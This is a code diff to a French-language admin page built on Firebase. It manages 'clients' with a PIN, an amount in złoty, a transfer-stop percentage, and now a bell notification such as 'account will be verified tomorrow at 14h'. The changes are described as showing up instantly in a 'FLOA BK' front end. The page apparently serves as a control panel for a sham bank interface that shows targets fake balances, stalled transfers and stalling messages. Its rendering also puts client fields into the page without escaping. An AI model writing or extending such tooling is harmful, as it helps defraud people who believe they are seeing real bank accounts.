@@ -15,13 +15,15 @@ header{background:var(--p);color:#fff;padding:16px 20px;display:flex;align-items
 .grid{display:grid;gap:10px;grid-template-columns:1fr 1fr}
 @media(max-width:700px){.grid{grid-template-columns:1fr}}
 label{font-size:11px;color:var(--m);display:block;margin-bottom:3px}
-input,select{width:100%;padding:9px 10px;border:1px solid var(--b);border-radius:7px;font-size:13px}
+input,select,textarea{width:100%;padding:9px 10px;border:1px solid var(--b);border-radius:7px;font-size:13px;font-family:inherit}
+textarea{resize:vertical;min-height:60px}
 .btn{background:var(--p);color:#fff;border:none;padding:9px 14px;border-radius:7px;cursor:pointer;font-weight:600}
 .btn2{background:#fff;color:var(--p);border:1px solid var(--p);padding:9px 14px;border-radius:7px;cursor:pointer}
 table{width:100%;border-collapse:collapse;font-size:12px}
 th,td{padding:9px;border-bottom:1px solid var(--b);text-align:left}
 th{background:#fafafa;color:var(--m);font-weight:600}
 .badge{background:#f3e8ff;color:var(--p);padding:2px 6px;border-radius:4px;font-size:10px}
+.badge-notif{background:#fef3c7;color:#92400e;padding:2px 6px;border-radius:4px;font-size:10px;margin-left:4px}
 h3{font-size:15px}
 </style>
 </head>
@@ -33,7 +35,7 @@ h3{font-size:15px}
 
 <div class="wrap">
   <div class="card">
-    <h3 style="margin:0 0 12px">Créer / Modifier un client</h3>
+    <h3 style="margin:0 12px">Créer / Modifier un client</h3>
     <div class="grid">
       <div><label>Nom complet</label><input id="nom" placeholder="KWIATKOWSKI PW"></div>
       <div><label>Adresse Gmail</label><input id="email" type="email" placeholder="nom@gmail.com"></div>
@@ -45,6 +47,7 @@ h3{font-size:15px}
       <div><label>Pays</label><input id="pays" placeholder="Pologne"></div>
       <div><label>Adresse domicile</label><input id="adresse" placeholder="ul. Warszawska 10"></div>
       <div><label>Numéro de téléphone</label><input id="tel" placeholder="+48 123 456 789"></div>
+      <div style="grid-column:1/-1"><label>Notification (affichée quand le client clique sur la cloche)</label><textarea id="notification" placeholder="Votre compte sera vérifié demain à 14h..."></textarea></div>
     </div>
     <div style="margin-top:10px">
       <label>Pourcentage d'arrêt du virement : <b id="pv">100</b>%</label>
@@ -81,8 +84,9 @@ h3{font-size:15px}
     <label>Liste des action(s) possible(s) sur un accès. <span style="color:var(--r)">requis</span></label>
     <select id="actionType" style="margin-bottom:10px">
       <option>Réinitialiser l'historique des virements</option>
+      <option>Supprimer la notification</option>
     </select>
-    <button class="btn" id="resetHistoryBtn" style="width:100%;background:#2563eb">Réinitialiser l'historique des virements →</button>
+    <button class="btn" id="actionBtn" style="width:100%;background:#2563eb">Exécuter l'action →</button>
   </div>
 </div>
 
@@ -125,6 +129,7 @@ onValue(clientsRef, snap => {
       pays: '',
       adresse: '',
       tel: '',
+      notification: '',
       created: Date.now()
     });
   }
@@ -134,7 +139,7 @@ onValue(clientsRef, snap => {
 function render(){
   const rows = Object.entries(data).map(([id,v]) => `
     <tr>
-      <td><b>${v.nom}</b><br><span style="color:#6b7280;font-size:10px">${v.email}${v.blocked?' <span style="color:#dc2626;font-weight:700">[BLOQUÉ]</span>':''}</span></td>
+      <td><b>${v.nom}</b><br><span style="color:#6b7280;font-size:10px">${v.email}${v.blocked?' <span style="color:#dc2626;font-weight:700">[BLOQUÉ]</span>':''}${v.notification?'<span class="badge-notif">🔔</span>':''}</span></td>
       <td><span class="badge">${v.pin}</span></td>
       <td>${Number(v.montant).toLocaleString('pl-PL')} ${v.devise||'zł'}</td>
       <td><span style="font-weight:700;color:var(--p)">${v.devise||'zł'}</span></td>
@@ -161,18 +166,19 @@ $('saveBtn').onclick = () => {
     pays: $('pays').value.trim(),
     adresse: $('adresse').value.trim(),
     tel: $('tel').value.trim(),
+    notification: $('notification').value.trim(),
     updated: Date.now()
   };
   if(!o.nom ||!o.email ||!o.pin){ alert('Nom, Email et PIN obligatoires'); return; }
   if(editId){ update(ref(db, 'clients/'+editId), o); } else { push(clientsRef, {...o, created: Date.now()}); }
   resetForm();
-  alert('Client enregistré avec devise ' + o.devise + '. Visible instantanément dans FLOA BK.');
+  alert('Client enregistré. Notification: ' + (o.notification? 'Oui' : 'Non'));
 };
 
 $('resetBtn').onclick = resetForm;
 
 function resetForm(){
-  ['nom','email','pin','montant','code','msg','pays','adresse','tel'].forEach(i=>$(i).value='');
+  ['nom','email','pin','montant','code','msg','pays','adresse','tel','notification'].forEach(i=>$(i).value='');
   $('devise').value='zł'; $('pct').value=100; $('pv').textContent='100'; editId=null;
 }
 
@@ -182,6 +188,7 @@ window.editClient = (id) => {
   $('montant').value=v.montant; $('devise').value=v.devise||'zł'; $('code').value=v.code; $('msg').value=v.msg;
   $('pct').value=v.pct; $('pv').textContent=v.pct;
   $('pays').value=v.pays||''; $('adresse').value=v.adresse||''; $('tel').value=v.tel||'';
+  $('notification').value=v.notification||'';
   window.scrollTo({top:0,behavior:'smooth'});
 };
 
@@ -192,7 +199,7 @@ window.delClient = (id) => {
 };
 
 function refreshLists(){
-  const opts = Object.entries(data).map(([id,v])=>`<option value="${id}">${v.nom} - ${v.email} (${v.devise||'zł'})${v.blocked?' (BLOQUÉ)':''}</option>`).join('');
+  const opts = Object.entries(data).map(([id,v])=>`<option value="${id}">${v.nom} - ${v.email} (${v.devise||'zł'})${v.blocked?' (BLOQUÉ)':''}${v.notification?' 🔔':''}</option>`).join('');
   if($('clientAccess')) $('clientAccess').innerHTML = opts;
   if($('clientAction')) $('clientAction').innerHTML = opts;
 }
@@ -211,11 +218,18 @@ $('unblockBtn').onclick = ()=>{
   update(ref(db,'clients/'+id), {blocked:false, updated:Date.now()});
   alert('Accès débloqué');
 };
-$('resetHistoryBtn').onclick = ()=>{
+$('actionBtn').onclick = ()=>{
   const id = $('clientAction').value;
+  const action = $('actionType').value;
   if(!id) return alert('Sélectionnez un client');
-  update(ref(db,'clients/'+id), {historyReset:Date.now()});
-  alert('Historique réinitialisé - effacé dans FLOA BK');
+
+  if(action === 'Réinitialiser l\'historique des virements'){
+    update(ref(db,'clients/'+id), {historyReset:Date.now()});
+    alert('Historique réinitialisé - effacé dans FLOA BK');
+  } else if(action === 'Supprimer la notification'){
+    update(ref(db,'clients/'+id), {notification:'', updated:Date.now()});
+    alert('Notification supprimée - la cloche affichera "Aucune notification"');
+  }
 };
 </script>
 </body>
